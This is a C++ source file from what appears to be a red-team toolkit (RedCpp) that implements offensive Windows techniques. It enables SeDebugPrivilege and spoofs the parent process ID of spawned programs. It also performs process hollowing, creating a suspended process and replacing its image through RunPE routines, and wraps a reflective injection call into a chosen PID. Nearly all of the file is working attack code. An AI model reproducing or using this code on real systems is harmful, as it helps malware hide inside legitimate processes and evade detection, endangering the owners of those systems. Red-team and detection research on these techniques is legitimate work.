/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include "spawn.h"

Spawn::Spawn()
{
}

Spawn::~Spawn()
{
}

BOOL Spawn::CurrentProcessAdjustToken()
{
    /*
    * Source: https://github.com/Al1ex/SelectMyParent/blob/main/SelectMyParent/SelectMyParent.cpp
    */

    HANDLE hToken;
    TOKEN_PRIVILEGES sTP;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
        {
            CloseHandle(hToken);
            return FALSE;
        }
        sTP.PrivilegeCount = 1;
        sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
        {
            CloseHandle(hToken);
            return FALSE;
        }
        CloseHandle(hToken);
        return TRUE;
    }
    return FALSE;
}

PPROC_THREAD_ATTRIBUTE_LIST Spawn::get_ppid_attribute_list(unsigned int ppid, HANDLE* hParentProcess)
{
    /*
    * Source: https://github.com/Al1ex/SelectMyParent/blob/main/SelectMyParent/SelectMyParent.cpp
    */

    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    SIZE_T cbAttributeListSize = 0;

    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    if (NULL == pAttributeList)
    {
#ifdef DEBUG
        printf("HeapAlloc error: %d\n", GetLastError());
#endif
        return NULL;
    }
    if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
    {
#ifdef DEBUG
        printf("InitializeProcThreadAttributeList error: %d\n", GetLastError());
#endif
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        return NULL;
    }
    if (!CurrentProcessAdjustToken())
    {
#ifdef DEBUG
        printf("CurrentProcessAdjustToken error: %d\n", GetLastError());
#endif
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        return NULL;
    }
    (*hParentProcess) = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid);

    if (NULL == (*hParentProcess))
    {
#ifdef DEBUG
        printf("OpenProcess error: %d\n", GetLastError());
#endif
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        return NULL;
    }

    if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, hParentProcess, sizeof(HANDLE), NULL, NULL))
    {
#ifdef DEBUG
        printf("UpdateProcThreadAttribute error: %d\n", GetLastError());
#endif
        CloseHandle((*hParentProcess));
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        return NULL;
    }

    return pAttributeList;
}

bool Spawn::start_exe(const char* exe_path, const char* args, unsigned int ppid)
{
    // additional information
    STARTUPINFOEX sie = { sizeof(sie) };
    PROCESS_INFORMATION pi;

    // set the size of the structures
    ZeroMemory(&sie, sizeof(sie));
    //sie.cb = sizeof(sie);
    ZeroMemory(&pi, sizeof(pi));

    std::string args_str;
    if (args != NULL)
        args_str = " " + std::string(args);
    else
        args_str = "";

    BOOL success = false;

    HANDLE hParentProcess = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    if (ppid != NULL)
    {
        pAttributeList = get_ppid_attribute_list(ppid, &hParentProcess);
        if (pAttributeList == NULL)
        {
            return false;
        }
        sie.lpAttributeList = pAttributeList;
    }

    // start the program up
    success = CreateProcessA(exe_path,   // the path
        (LPSTR)args_str.c_str(),        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT,    // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &sie.StartupInfo,            // Pointer to STARTUPINFO structure
        &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    );

    unsigned int error = 0;
    if (!success)
        error = GetLastError();

    if (ppid != NULL)
    {
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hParentProcess);
    }

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (success)
        return true;
    else
    {
        SetLastError(error);
        return false;
    }
}

bool Spawn::start_process_hollowing(const char* exe_path, LPVOID exe_data, unsigned int ppid)
{
#ifdef DEBUG
	printf("[PROCESS HOLLOWING]\n");
#endif

	const BOOL bPE = IsValidPE(exe_data);
	if (!bPE)
	{
#ifdef DEBUG
		printf("[-] The PE file is not valid !\n");
#endif
		return false;
	}

#ifdef DEBUG
	printf("[+] The PE file is valid.\n");
#endif

	/*
	STARTUPINFOA SI;
	PROCESS_INFORMATION PI;

	ZeroMemory(&SI, sizeof(SI));
	SI.cb = sizeof(SI);
	ZeroMemory(&PI, sizeof(PI));
	*/

	// additional information
	STARTUPINFOEX sie = { sizeof(sie) };
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&sie, sizeof(sie));
	//sie.cb = sizeof(sie);
	ZeroMemory(&pi, sizeof(pi));

	/*
	* Parent PID spoofing
	*/
	HANDLE hParentProcess = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	if (ppid != NULL)
	{
		pAttributeList = get_ppid_attribute_list(ppid, &hParentProcess);
		if (pAttributeList == NULL)
		{
			return false;
		}
		sie.lpAttributeList = pAttributeList;
	}

	const BOOL bProcessCreation = CreateProcessA(exe_path, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &sie.StartupInfo, &pi);
	if (!bProcessCreation)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to create the target process !\n");
#endif
		CleanAndExitProcess(&pi);
		return false;
	}

	BOOL bTarget32;
	IsWow64Process(pi.hProcess, &bTarget32);

	ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };
	if (bTarget32)
	{
		ProcessAddressInformation = GetProcessAddressInformation32(&pi);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
		{
#ifdef DEBUG
			printf("[-] An error is occured when trying to get the image base address of the target process !\n");
#endif
			CleanAndExitProcess(&pi);
			return false;
		}
	}
	else
	{
		ProcessAddressInformation = GetProcessAddressInformation64(&pi);
		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
		{
#ifdef DEBUG
			printf("[-] An error is occured when trying to get the image base address of the target process !\n");
#endif
			CleanAndExitProcess(&pi);
			return false;
		}
	}

#ifdef DEBUG
	printf("[+] Target Process PEB : 0x%p\n", ProcessAddressInformation.lpProcessPEBAddress);
	printf("[+] Target Process Image Base : 0x%p\n", ProcessAddressInformation.lpProcessImageBaseAddress);
#endif

	const BOOL bSource32 = IsPE32(exe_data);
#ifdef DEBUG
	if (bSource32)
		printf("[+] Source PE Image architecture : x86\n");
	else
		printf("[+] Source PE Image architecture : x64\n");

	if (bTarget32)
		printf("[+] Target PE Image architecture : x86\n");
	else
		printf("[+] Target PE Image architecture : x64\n");
#endif

	if (bSource32 && bTarget32 || !bSource32 && !bTarget32)
	{
#ifdef DEBUG
		printf("[+] Architecture are compatible !\n");
#endif
	}
	else
	{
#ifdef DEBUG
		printf("[-] Architecture are not compatible !\n");
#endif
		CleanAndExitProcess(&pi);
		return false;
	}

	DWORD dwSourceSubsystem;
	if (bSource32)
		dwSourceSubsystem = GetSubsytem32(exe_data);
	else
		dwSourceSubsystem = GetSubsytem64(exe_data);

	if (dwSourceSubsystem == (DWORD)-1)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the subsytem of the source image.\n");
#endif
		CleanAndExitProcess(&pi);
		return false;
	}

#ifdef DEBUG
	printf("[+] Source Image subsystem : 0x%X\n", (UINT)dwSourceSubsystem);
#endif

	DWORD dwTargetSubsystem;
	if (bTarget32)
		dwTargetSubsystem = GetSubsystemEx32(pi.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
	else
		dwTargetSubsystem = GetSubsystemEx64(pi.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);

	if (dwTargetSubsystem == (DWORD)-1)
	{
#ifdef DEBUG
		printf("[-] An error is occured when trying to get the subsytem of the target process.\n");
#endif
		CleanAndExitProcess(&pi);
		return false;
	}

#ifdef DEBUG
	printf("[+] Target Process subsystem : 0x%X\n", (UINT)dwTargetSubsystem);
#endif

	if (dwSourceSubsystem == dwTargetSubsystem)
	{
#ifdef DEBUG
		printf("[+] Subsytems are compatible.\n");
#endif
	}
	else
	{
#ifdef DEBUG
		printf("[-] Subsytems are not compatible.\n");
#endif
		CleanAndExitProcess(&pi);
		return false;
	}

	BOOL bHasReloc;
	if (bSource32)
		bHasReloc = HasRelocation32(exe_data);
	else
		bHasReloc = HasRelocation64(exe_data);

#ifdef DEBUG
	if (!bHasReloc)
		printf("[+] The source image doesn't have a relocation table.\n");
	else
		printf("[+] The source image has a relocation table.\n");
#endif


	if (bSource32 && !bHasReloc)
	{
		if (RunPE32(&pi, exe_data))
		{
#ifdef DEBUG
			printf("[+] The injection has succeed !\n");
#endif
			CleanProcess(&pi);
			return true;
		}
	}

	if (bSource32 && bHasReloc)
	{
		if (RunPEReloc32(&pi, exe_data))
		{
#ifdef DEBUG
			printf("[+] The injection has succeed !\n");
#endif
			CleanProcess(&pi);
			return true;
		}
	}

	if (!bSource32 && !bHasReloc)
	{
		if (RunPE64(&pi, exe_data))
		{
#ifdef DEBUG
			printf("[+] The injection has succeed !\n");
#endif
			CleanProcess(&pi);
			return true;
		}
	}

	if (!bSource32 && bHasReloc)
	{
		if (RunPEReloc64(&pi, exe_data))
		{
#ifdef DEBUG
			printf("[+] The injection has succeed !\n");
#endif
			CleanProcess(&pi);
			return true;
		}
	}

#ifdef DEBUG
	printf("[-] The injection has failed !\n");
#endif

	if (pi.hThread != nullptr)
		CloseHandle(pi.hThread);

	if (pi.hProcess != nullptr)
	{
		TerminateProcess(pi.hProcess, -1);
		CloseHandle(pi.hProcess);
	}

	return false;
}

bool Spawn::reflective_injection(unsigned int pid, LPVOID exe_data, size_t exe_data_size)
{
	BOOL success = InjectToProcess(pid, exe_data, exe_data_size);

	if (success == TRUE)
		return true;
	else
		return false;
}

